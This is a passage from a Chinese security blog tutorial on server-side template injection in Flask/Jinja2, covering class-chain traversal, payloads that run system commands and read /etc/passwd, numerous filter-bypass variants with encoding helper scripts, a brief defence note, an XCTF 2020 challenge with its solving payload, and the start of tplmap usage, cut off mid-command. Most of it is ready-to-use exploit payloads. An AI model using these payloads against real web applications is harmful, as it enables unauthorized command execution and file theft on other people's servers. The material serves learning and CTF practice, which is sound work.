                <p>image-20210127132753924</p>
            </figure>

<h3 id="构造链路"><a href="#构造链路" class="headerlink" title="构造链路"></a>构造链路</h3><h4 id="获取对象所属的类"><a href="#获取对象所属的类" class="headerlink" title="获取对象所属的类"></a>获取对象所属的类</h4><p>可以通过使用<code>str</code>，<code>dict</code>,<code>tuple</code>，<code>list</code>等等</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">''</span>.__class__&#125;&#125;</span><br><span class="line">&#123;&#123;&#123;&#125;.__class__&#125;&#125;</span><br><span class="line">&#123;&#123;().__class__&#125;&#125;</span><br><span class="line">&#123;&#123;[].__class__&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="获取基类"><a href="#获取基类" class="headerlink" title="获取基类"></a>获取基类</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__base__&#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__bases__[<span class="number">0</span>]&#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__mro__[<span class="number">1</span>]&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="获取子类"><a href="#获取子类" class="headerlink" title="获取子类"></a>获取子类</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__base__.__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="寻找利用类脚本"><a href="#寻找利用类脚本" class="headerlink" title="寻找利用类脚本"></a>寻找利用类脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">search = <span class="string">'popen'</span>  <span class="comment">#方法名称</span></span><br><span class="line"></span><br><span class="line">num = <span class="number">-1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">''</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            print(i,num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p><code>&lt;class &#39;os._wrap_close&#39;&gt; 128</code>返回方法位置，表示在基类的第128个子类名称为<code>os._wrap_close</code>中</p>
<h4 id="构造语句"><a href="#构造语句" class="headerlink" title="构造语句"></a>构造语句</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__base__.__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">'popen'</span>](<span class="string">'whoami'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>我们使用构造的语句可以查看到<code>whoami</code>命令执行的结果</p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210127172339276.png" alt="image-20210127172339276" title class>
                <p>image-20210127172339276</p>
            </figure>

<p>如果需要构造其他方法，我们也是使用同样的方法，先找到方法的位置，进行构造即可。</p>
<h3 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h3><p>python2和python3的区别</p>
<ul>
<li>python2中的<code>string</code>不直接属于基类需要两次调用返回继承类才找得到基类<code>&#39;&#39;.__class__.__base__.__base__</code></li>
<li>python3中移除了file类，所以在python3中file类读写不能使用</li>
</ul>
<h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#读取文件</span></span><br><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'open'</span>](<span class="string">'/etc/passwd'</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#python2,file类</span></span><br><span class="line">&#123;&#123;[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/etc/passwd'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#popen与system区别：popen可以看到返回结果，system只返回结果值即成功是0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#popen</span></span><br><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__base__.__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">'popen'</span>](<span class="string">'whoami'</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#os</span></span><br><span class="line">&#123;&#123;<span class="string">""</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">196</span>].__init__.__globals__[<span class="string">'os'</span>].popen(<span class="string">'whoami'</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#__import__</span></span><br><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__[<span class="string">"__import__"</span>](<span class="string">'os'</span>).popen(<span class="string">'whoami'</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#通过__builtins__利用eval和__import__</span></span><br><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">"__import__('os').popen('whoami').read()"</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'__import__'</span>](<span class="string">'os'</span>).popen(<span class="string">'whoami'</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__.__builtins__.eval(<span class="string">"__import__('os').popen('whoami').read()"</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__.__builtins__.__import__(<span class="string">'os'</span>).popen(<span class="string">'whoami'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="常用绕过"><a href="#常用绕过" class="headerlink" title="常用绕过"></a>常用绕过</h4><h5 id="过滤中括号"><a href="#过滤中括号" class="headerlink" title="过滤中括号 [ ]"></a>过滤中括号 <code>[ ]</code></h5><ul>
<li>利用<code>pop()</code> 或<code>__getitem__()</code>绕过</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__base__.__subclasses__().pop(<span class="number">75</span>).__init__.__globals__.__builtins__.eval(<span class="string">"__import__('os').popen('whoami').read()"</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__base__.__subclasses__().__getitem__(<span class="number">75</span>).__init__.__globals__.__builtins__.eval(<span class="string">"__import__('os').popen('whoami').read()"</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__base__.__subclasses__().__getitem__(<span class="number">75</span>).__init__.__globals__.__getitem__(<span class="string">'__builtins__'</span>).__getitem__(<span class="string">'__import__'</span>)(<span class="string">'os'</span>).popen(<span class="string">'whoami'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h5 id="过滤句号"><a href="#过滤句号" class="headerlink" title="过滤句号."></a>过滤句号<code>.</code></h5><ul>
<li>利用<code>|attr()</code>函数</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#&#123;&#123;().__class__&#125;&#125;和&#123;&#123;()|attr('__class__')&#125;&#125;是同等</span></span><br><span class="line">&#123;&#123;()|attr(<span class="string">'__class__'</span>)|attr(<span class="string">'__base__'</span>)|attr(<span class="string">'__subclasses__'</span>)()|attr(<span class="string">'__getitem__'</span>)(<span class="number">75</span>)|attr(<span class="string">'__init__'</span>)|attr(<span class="string">'__globals__'</span>)|attr(<span class="string">'__getitem__'</span>)(<span class="string">'__builtins__'</span>)|attr(<span class="string">'__getitem__'</span>)(<span class="string">'eval'</span>)(<span class="string">'__import__("os").popen("whoami").read()'</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#&#123;&#123;().__class__&#125;&#125;和&#123;【['__class__']&#125;&#125;同等</span></span><br><span class="line">&#123;&#123;<span class="string">''</span>[<span class="string">'__class__'</span>][<span class="string">'__base__'</span>][<span class="string">'__subclasses__'</span>]()[<span class="number">128</span>][<span class="string">'__init__'</span>][<span class="string">'__globals__'</span>][<span class="string">'popen'</span>](<span class="string">'whoami'</span>)[<span class="string">'read'</span>]()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h5 id="过滤下划线"><a href="#过滤下划线" class="headerlink" title="过滤下划线_"></a>过滤下划线<code>_</code></h5><ul>
<li>利用Flask request 属性详解</li>
</ul>
<blockquote>
<p>request.args.name<br>request.values.name<br>request.cookies.name<br>request.headers.name<br>request.form.name</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#request.args.name</span></span><br><span class="line">&#123;&#123;<span class="string">''</span>[request.args.x1][request.args.x2][request.args.x3]()[<span class="number">75</span>][request.args.x4][request.args.x5][request.args.x6][request.args.x7](<span class="string">'os'</span>).popen(<span class="string">'whoami'</span>).read()&#125;&#125;&amp;x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__init__&amp;x5=__globals__&amp;x6=__builtins__&amp;x7=__import__</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210130001424350.png" alt="image-20210130001455460" title class>
                <p>image-20210130001455460</p>
            </figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#request.values.name</span></span><br><span class="line">&#123;&#123;<span class="string">''</span>[request.values.x1][request.values.x2][request.values.x3]()[<span class="number">75</span>][request.values.x4][request.values.x5][request.values.x6][request.values.x7](<span class="string">'os'</span>).popen(<span class="string">'whoami'</span>).read()&#125;&#125;&amp;x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__init__&amp;x5=__globals__&amp;x6=__builtins__&amp;x7=__import__</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210130001455460.png" alt="image-20210130001424350" title class>
                <p>image-20210130001424350</p>
            </figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#request.cookies.name</span></span><br><span class="line">&#123;&#123;<span class="string">''</span>[request.cookies.x1][request.cookies.x2][request.cookies.x3]()[<span class="number">75</span>][request.cookies.x4][request.cookies.x5][request.cookies.x6][request.cookies.x7](<span class="string">'os'</span>).popen(<span class="string">'whoami'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210127174548390.png" alt="image-20210130000229618" title class>
                <p>image-20210130000229618</p>
            </figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#request.headers.name</span></span><br><span class="line">&#123;&#123;<span class="string">''</span>[request.headers.x1][request.headers.x2][request.headers.x3]()[<span class="number">75</span>][request.headers.x4][request.headers.x5][request.headers.x6][request.headers.x7](<span class="string">'os'</span>).popen(<span class="string">'whoami'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210130000229618.png" alt="image-20210129235820486" title class>
                <p>image-20210129235820486</p>
            </figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#request.form.name</span></span><br><span class="line">&#123;&#123;<span class="string">''</span>[request.form.x1][request.form.x2][request.form.x3]()[<span class="number">75</span>][request.form.x4][request.form.x5][request.form.x6][request.form.x7](<span class="string">'os'</span>).popen(<span class="string">'whoami'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210130002010844.png" alt="image-20210130002010844" title class>
                <p>image-20210130002010844</p>
            </figure>

<h5 id="过滤花括号"><a href="#过滤花括号" class="headerlink" title="过滤花括号"></a>过滤花括号{{}}</h5><ul>
<li>利用{%%}绕过

</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="keyword">print</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">"__import__('os').popen('whoami').read()"</span>)%&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#通过盲注方法</span></span><br><span class="line">&#123;%i<span class="string">f""</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">"__import__('os').popen('whoami').read()[0]=='w'"</span>)%&#125;success&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>

<h5 id="过滤引号-39-和-quot"><a href="#过滤引号-39-和-quot" class="headerlink" title="过滤引号&#39;和&quot;"></a>过滤引号<code>&#39;</code>和<code>&quot;</code></h5><ul>
<li>利用chr绕过</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr = ().__class__.__base__.__subclasses__()[<span class="number">128</span>].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">128</span>].__init__.__globals__.popen(chr(<span class="number">119</span>)%<span class="number">2</span>bchr(<span class="number">104</span>)%<span class="number">2</span>bchr(<span class="number">111</span>)%<span class="number">2</span>bchr(<span class="number">97</span>)%<span class="number">2</span>bchr(<span class="number">109</span>)%<span class="number">2</span>bchr(<span class="number">105</span>)).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><code>构造chr小脚本</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">'whoami'</span></span><br><span class="line"><span class="comment"># s为要编码内容，%2b表示+连接的意思</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_chr</span><span class="params">(s)</span>:</span></span><br><span class="line">    c = <span class="string">''</span> </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        c += <span class="string">'chr('</span>+str(ord(i))+<span class="string">')%2b'</span></span><br><span class="line">    <span class="keyword">return</span> c[<span class="number">0</span>:<span class="number">-3</span>]	<span class="comment">#去掉最后一个%2b</span></span><br><span class="line"></span><br><span class="line">print(encode_chr(s))</span><br></pre></td></tr></table></figure>

<h5 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用字符串拼接绕过</span></span><br><span class="line">&#123;&#123;<span class="string">''</span>[<span class="string">'__cla'</span><span class="string">'ss__'</span>].__base__.__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">'popen'</span>](<span class="string">'whoami'</span>).read()&#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">''</span>[<span class="string">'__cla'</span>+<span class="string">'ss__'</span>].__base__.__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">'popen'</span>](<span class="string">'whoami'</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;<span class="string">''</span>.__getattribute__(<span class="string">"__cla"</span>+<span class="string">"ss__"</span>).__base__.__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">'popen'</span>](<span class="string">'whoami'</span>).read()&#125;&#125;</span><br><span class="line"><span class="comment">#编码绕过</span></span><br><span class="line">&#123;&#123;<span class="string">''</span>[<span class="string">'\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f'</span>][<span class="string">'__base__'</span>][<span class="string">'__subclasses__'</span>]()[<span class="number">128</span>][<span class="string">'__init__'</span>][<span class="string">'__globals__'</span>][<span class="string">'popen'</span>](<span class="string">'whoami'</span>)[<span class="string">'read'</span>]()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#用__enter__或__exit__替代__init__</span></span><br><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__base__.__subclasses__()[<span class="number">128</span>].__enter__.__globals__[<span class="string">'popen'</span>](<span class="string">'whoami'</span>).read()&#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__base__.__subclasses__()[<span class="number">128</span>].__exit__.__globals__[<span class="string">'popen'</span>](<span class="string">'whoami'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><code>构造编码小脚本</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">'__class__'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_hex</span><span class="params">(s)</span>:</span></span><br><span class="line">    c = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        c += <span class="string">r'\x'</span>+i.encode().hex()</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">print(encode_hex(s))</span><br></pre></td></tr></table></figure>

<h3 id="防护方法"><a href="#防护方法" class="headerlink" title="防护方法"></a>防护方法</h3><ul>
<li><p>对用户输入参数进行限制和检查</p>
</li>
<li><p>使用固定模板</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    name = request.args.get(<span class="string">'name'</span>)</span><br><span class="line">    <span class="keyword">if</span> name:</span><br><span class="line">        t = Template(<span class="string">"Hello：&#123;&#123;n&#125;&#125;"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        t = Template(<span class="string">"Hello,What's your name"</span>)</span><br><span class="line">    <span class="keyword">return</span> t.render(n=name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210129235820486.png" alt="image-20210127174548390" title class>
                <p>image-20210127174548390</p>
            </figure>

<h2 id="XCTF2020华为云"><a href="#XCTF2020华为云" class="headerlink" title="XCTF2020华为云"></a>XCTF2020华为云</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template,redirect</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe_msg</span><span class="params">(msg)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'args'</span> <span class="keyword">in</span> msg <span class="keyword">or</span> <span class="string">'_'</span> <span class="keyword">in</span> msg <span class="keyword">or</span>  <span class="string">'path'</span> <span class="keyword">in</span> msg <span class="keyword">or</span> <span class="string">'host'</span> <span class="keyword">in</span> msg <span class="keyword">or</span> <span class="string">'headers'</span> <span class="keyword">in</span> msg <span class="keyword">or</span> <span class="string">'endpoint'</span> <span class="keyword">in</span> msg <span class="keyword">or</span> <span class="string">'json'</span> <span class="keyword">in</span> msg <span class="keyword">or</span> <span class="string">'user_agent'</span> <span class="keyword">in</span> msg <span class="keyword">or</span> <span class="string">'"'</span> <span class="keyword">in</span> msg <span class="keyword">or</span> <span class="string">"'"</span> <span class="keyword">in</span> msg <span class="keyword">or</span> <span class="string">"%"</span> <span class="keyword">in</span> msg:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/", methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"index.html"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/over", methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'over.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/success", methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">success</span><span class="params">()</span>:</span></span><br><span class="line">    msg = request.args.get(<span class="string">"msg"</span>)</span><br><span class="line">    <span class="keyword">if</span>(msg == <span class="literal">None</span>):</span><br><span class="line">        msg = <span class="string">'anonymous'</span></span><br><span class="line">    <span class="keyword">if</span> safe_msg(msg):</span><br><span class="line">        t = Template(<span class="string">"Good Job! "</span> + msg + <span class="string">" . But sorry, there isn't flag"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        t = Template(<span class="string">"You look dangerous....."</span>)</span><br><span class="line">    <span class="keyword">return</span> t.render(request=request)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'127.0.0.1'</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>

<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(request.values.x1)|attr(request.values.x2)|attr(request.values.x3)()|attr(request.values.x4) (<span class="number">75</span>)|attr(request.values.x5)|attr(request.values.x6)|attr(request.values.x4)(request.values.x7)|attr(request.values.x4)(request.values.x8) (request.values.x9)&#125;&#125;&amp;x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(<span class="string">'os'</span>).popen(<span class="string">'whoami'</span>).read()</span><br></pre></td></tr></table></figure>

<h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><h3 id="Tplmap简介"><a href="#Tplmap简介" class="headerlink" title="Tplmap简介"></a>Tplmap简介</h3><p>tplmap通过许多沙盒转义技术来帮助利用代码注入和服务器端模板注入漏洞</p>
<p>下载地址：<code>https://github.com/epinna/tplmap</code></p>
<h3 id="Tplmap使用"><a href="#Tplmap使用" class="headerlink" title="Tplmap使用"></a>Tplmap使用</h3><p>安装依赖</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure>

<p>简单使用</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>./tplmap.py -u url</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>例子:</span><br><span class="line">root@wisejay:~/桌面/wisejay/tplmap# ./tplmap.py -u 